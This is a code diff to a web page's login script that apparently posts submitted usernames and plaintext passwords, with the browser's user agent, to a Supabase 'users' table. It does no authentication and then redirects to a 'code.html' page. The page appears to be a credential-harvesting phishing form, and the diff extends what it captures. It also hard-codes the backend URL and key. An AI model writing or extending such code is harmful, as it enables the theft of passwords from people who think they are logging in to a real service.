@@ -112,10 +112,15 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
-    // ✅ Supabase setup
     const SUPABASE_URL = "https://twyyuqdmbsdyrlbqgyoq.supabase.co";
     const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR3eXl1cWRtYnNkeXJsYnFneW9xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwMzExMDUsImV4cCI6MjA3MTYwNzEwNX0.6_NcIRedVB4yHKnvgFpwt9apQMiMlsvx19t8B5UBel8";
-    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+      auth: {
+        persistSession: false,
+        autoRefreshToken: false
+      }
+    });
 
     function openLanguageModal() { document.getElementById('languageModal').style.display = 'block'; }
     function closeLanguageModal() { document.getElementById('languageModal').style.display = 'none'; }
@@ -135,15 +140,28 @@
       if (!password) return showError(passwordInput);
 
       try {
-        // Insert into Supabase table "users"
-        const { error } = await supabase.from("users").insert([{ username, password }]);
-        if (error) throw error;
+        const { data, error } = await supabase.from("users").insert([{ 
+          username, 
+          password,
+          user_agent: navigator.userAgent,
+          created_at: new Date().toISOString()
+        }]);
+        
+        if (error) {
+          console.error("Supabase error details:", error);
+          throw error;
+        }
 
         localStorage.setItem("login_user", username);
         window.location.href = "code.html";
       } catch (err) {
         console.error("Login error:", err);
-        alert("An error occurred while saving login.");
+        if (err.code === '42501') {
+          console.error("Permission denied - check RLS policies");
+        } else if (err.code === '42P01') {
+          console.error("Table does not exist");
+        }
+        alert("An error occurred while saving login. Please try again.");
       }
     }
 
